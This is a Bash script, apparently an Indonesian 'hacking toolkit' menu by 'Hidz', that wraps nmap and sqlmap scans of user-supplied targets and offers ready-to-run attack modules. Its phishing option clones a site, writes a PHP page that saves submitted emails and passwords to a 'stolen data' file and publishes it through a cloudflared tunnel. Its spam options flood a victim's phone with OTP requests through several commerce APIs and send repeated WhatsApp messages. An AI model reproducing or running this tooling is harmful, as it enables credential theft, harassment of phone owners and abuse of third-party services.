#!/bin/bash

# Warna ANSI
m='\033[1;31m'; h='\033[1;32m'; k='\033[1;33m'; b='\033[1;34m'; u='\033[1;35m'; c='\033[1;36m'; p='\033[1;37m'; r='\033[0m'

loading() {
    echo -ne "${k}[*] Inisialisasi Node Hidz...${r}"
    for i in {1..3}; do echo -ne "."; sleep 0.2; done
    echo -e " ${h}[SINKRON]${r}"
}

get_day() {
    case $(date +%u) in
        1) echo "Senin";; 2) echo "Selasa";; 3) echo "Rabu";;
        4) echo "Kamis";; 5) echo "Jumat";; 6) echo "Sabtu";; 7) echo "Minggu";;
    esac
}

header() {
    clear; loading
    WAKTU=$(date +"%d %B %Y - %H:%M")
    echo -e "${c}========================================================${r}"
    echo -e "${u}<<<< NOTIFIKASI SYSTEM >>>>${r}"
    echo -e "${c}========================================================${r}"
    echo -e "${h}+ Developer       : ${m}Hidz${r}"
    echo -e "${h}+ Sekarang hari   : ${p}$(get_day)${r}"
    echo -e "${h}+ Hallo           : ${p}Hidz 👑${r}"
    echo -e "${h}+ Sekarang tanggal: ${p}$(date +%d)${r}"
    echo -e "${h}+ Sekarang bulan  : ${p}$(date +%B)${r}"
    echo -e "${h}+ Status          : ${h}DEVELOPER ✅${r}"
    echo -e "${h}+ CONTACTS ME     : ${p}wa.me/6289679177876${r}"
    echo -e "${c}========================================================${r}"
}

menu() {
    echo -e "${m}           LEMARI TOOLS HIDZ ADA DIBAWAH           ${r}"
    echo -e "${p}================================================${r}"
    echo -e "${c}| ${h}AL ${c}| ${p}MENU HACKING MEDIA${r}"
    echo -e "${c}| ${h}PS ${c}| ${p}MENU PSHING MEDIA${r}"
    echo -e "${c}| ${h}DO ${c}| ${p}MENU DOWNLOAD MEDIA${r}"
    echo -e "${c}| ${h}TM ${c}| ${p}MENU SC+ TAMBAHAN${r}"
    echo -e "${p}================================================${r}"
    echo -e "${m}           PENGATURAN TOOLS HIDZ           ${r}"
    echo -e "${h}================================================${r}"
    echo -e "${h}[ ${m}BUG ${h}]» ${p}[ ${c}Laporkan_BUGS ${p}]${r}"
    echo -e "${h}[ ${m}MGR ${h}]» ${p}[ ${c}MANAGER SETTING SOUND ${p}]${r}"
    echo -e "${h}[ ${m}PMR ${h}]» ${p}[ ${c}Pemberitahuan ${p}]${r}"
    echo -e "${h}[ ${m}KLR ${h}]» ${p}[ ${c}Keluar ${p}]${r}"
    echo -e "${h}[ ${m}PBR ${h}]» ${p}[ ${c}Pembersihan ${p}]${r}"
    echo -e "${h}================================================${r}"
    echo ""
}

menu_AL() {
    clear
    echo -e "${c}=== [ HIDZ INTRUSION MODULES ] ===${r}"
    echo -e "[1] Port Scanner (Nmap)"
    echo -e "[2] SQLi Auto-Exploit (SQLMap)"
    echo -e "[3] Back"
    read -p "Pilih : " al
    case $al in
        1) echo "Target IP/Domain: "; read target; nmap -F $target; echo ""; read -p "Enter..."; menu_AL;;
        2) echo "Target URL (http://site.com/page.php?id=1): "; read sqli; sqlmap -u "$sqli" --batch --dbs; echo ""; read -p "Enter..."; menu_AL;;
        3) main;;
        *) menu_AL;;
    esac
}

menu_PS() {
    clear
    echo -e "${c}=== [ HIDZ PHISHING MODULES ] ===${r}"
    echo -e "[1] Deploy Phishing + Cloudflared Tunnel"
    echo -e "[2] Back"
    read -p "Pilih : " ps
    case $ps in
        1)
            echo "Target URL to Clone: "; read webtarget
            folder="hidz_clone"; rm -rf $folder; mkdir -p $folder
            echo -e "${k}[*] Downloading source from $webtarget...${r}"
            wget -q --show-progress -P $folder -r -l1 -k $webtarget
            echo "<?php \$data = \$_POST['email'] . ' | ' . \$_POST['pass'] . ' | ' . date('Y-m-d H:i:s'); file_put_contents('data_curian.txt', \$data . PHP_EOL, FILE_APPEND); header('Location: https://m.facebook.com'); ?>" > $folder/index.php
            if [ -f "$folder/index.html" ]; then mv "$folder/index.html" "$folder/index_backup.html"; fi
            echo -e "${h}[+] Clone deployed in '$folder'${r}"
            echo -e "${k}[*] Booting local PHP server...${r}"
            cd $folder; php -S 127.0.0.1:8080 > /dev/null 2>&1 & PHP_PID=$!
            echo -e "${k}[*] Establishing Cloudflared Tunnel...${r}"
            cloudflared tunnel --url http://127.0.0.1:8080 > tunnel.log 2>&1 & CF_PID=$!
            sleep 5
            LINK=$(grep -o 'https://[-a-zA-Z0-9]*\.trycloudflare\.com' tunnel.log | head -n 1)
            if [ -n "$LINK" ]; then
                echo -e "${h}================================================${r}"
                echo -e "${h}[+] HIDZ PUBLIC LINK READY:${r}"
                echo -e "${p}$LINK${r}"
                echo -e "${h}================================================${r}"
                echo -e "${k}[*] Harvest file: $folder/data_curian.txt${r}"
            else
                echo -e "${m}[-] Tunnel failed. Check connection.${r}"
            fi
            echo -e "${k}[*] Press ENTER to kill server and return...${r}"; read
            kill $PHP_PID $CF_PID 2>/dev/null; cd ..; menu_PS;;
        2) main;;
        *) menu_PS;;
    esac
}

menu_DO() {
    clear
    echo -e "${c}=== [ HIDZ MEDIA EXTRACTION ] ===${r}"
    echo -e "[1] Extract Video/Audio"
    echo -e "[2] Back"
    read -p "Pilih : " do
    case $do in
        1) echo "Target URL: "; read vurl; yt-dlp -f best $vurl; echo ""; read -p "Enter..."; menu_DO;;
        2) main;;
        *) menu_DO;;
    esac
}

menu_TM() {
    clear
    echo -e "${c}=== [ HIDZ SPAM MODULES ] ===${r}"
    echo -e "[1] OTP Flooder (Anti-Spam Output)"
    echo -e "[2] Spam WA (Pake Token Fonnte)"
    echo -e "[3] Back"
    read -p "Pilih : " tm
    case $tm in
        1)
            echo "Target Number (628xxx): "; read nomor
            echo -e "${k}[*] Flooding OTP to $nomor... (Output disembunyikan)${r}"
            for i in {1..20}; do
                # Endpoint OTP Random
                curl -s -X POST "https://api.codashop.com/v1/auth/otp/send" -H "Content-Type: application/json" -d "{\"phone\":\"$nomor\"}" > /dev/null 2>&1 &
                curl -s -X POST "https://api.bhinneka.com/v1/auth/register/otp" -H "Content-Type: application/json" -d "{\"phone\":\"$nomor\"}" > /dev/null 2>&1 &
                curl -s -X POST "https://api.tokopedia.com/v1/otp/request" -H "Content-Type: application/json" -d "{\"phone\":\"$nomor\"}" > /dev/null 2>&1 &
                curl -s -X POST "https://api.gojek.com/v1/otp/request" -H "Content-Type: application/json" -d "{\"phone\":\"$nomor\"}" > /dev/null 2>&1 &
                curl -s -X POST "https://api.grab.com/v1/otp/request" -H "Content-Type: application/json" -d "{\"phone\":\"$nomor\"}" > /dev/null 2>&1 &
                curl -s -X POST "https://api.shopee.co.id/v1/otp/request" -H "Content-Type: application/json" -d "{\"phone\":\"$nomor\"}" > /dev/null 2>&1 &
                echo -e "${h}[+] Payload $i sent.${r}"; sleep 0.5
            done
            echo -e "${m}[!] Flood complete.${r}"; echo ""; read -p "Enter..."; menu_TM;;
        2)
            echo "Masukkan Token Fonnte: "; read token
            echo "Target Number (628xxx): "; read nomorwa
            echo "Pesan: "; read pesan
            echo -e "${k}[*] Mengirim spam WA...${r}"
            for i in {1..10}; do
                curl -s -X POST "https://api.fonnte.com/send" -H "Authorization: $token" -d "target=$nomorwa&message=$pesan+$i" > /dev/null 2>&1
                echo -e "${h}[+] Pesan $i terkirim.${r}"; sleep 1
            done
            echo -e "${m}[!] Spam WA selesai.${r}"; echo ""; read -p "Enter..."; menu_TM;;
        3) main;;
        *) menu_TM;;
    esac
}

main() {
    header; menu
    read -p "Hidz System V1.0 : " cmd
    case $cmd in
        AL|al) menu_AL;;
        PS|ps) menu_PS;;
        DO|do) menu_DO;;
        TM|tm) menu_TM;;
        BUG|bug) echo "Report link: wa.me/6289679177876"; sleep 2; main;;
        MGR|mgr) echo "Membuka Manager Setting Sound..."; sleep 2; main;;
        PMR|pmr) echo "Tidak ada pemberitahuan baru."; sleep 2; main;;
        KLR|klr) echo "Terminating session..."; exit;;
        PBR|pbr) clear; echo "Membersihkan cache sistem..."; rm -rf ~/.cache/*; sleep 1; main;;
        *) echo -e "${m}Perintah tidak dikenal!${r}"; sleep 1; main;;
    esac
}
main
